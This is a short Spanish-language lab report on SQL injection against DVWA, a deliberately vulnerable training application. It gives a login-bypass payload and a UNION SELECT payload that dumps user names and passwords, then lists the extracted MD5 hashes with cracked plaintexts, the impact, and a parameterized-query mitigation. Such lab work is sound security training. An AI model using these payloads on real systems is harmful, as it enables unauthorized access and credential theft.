# Laboratorio 2 - SQL Injection DVWA
## Hallazgo
Bypass de autenticación con payload: 1' OR '1'='1

## Evidencia
- [Foto 1: Dump de usuarios]
- Payload UNION SELECT para extraer credenciales: 1' UNION SELECT user,password FROM users#

## Impacto
Exposición total de la base de datos de usuarios

## Mitigación
Usar Prepared Statements / Consultas parametrizadas

## Lab 2.1 - Extraccion UNION

Payload: 1' UNION SELECT user,password FROM users#

Resultado:
- admin:5f4dcc3b5aa765d61d8327deb882cf99 (password)
- gordonb:e99a18c428cb38d5f260853678922e03 (abc123)
- 1337:8d3533d75ae2c3966d7e0d4fcc69216b (charley)
- pablo:0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)
- smithy:5f4dcc3b5aa765d61d8327deb882cf99 (password)

Impacto: CRITICO - OWASP A03:2021 Injection - Extraccion total de credenciales
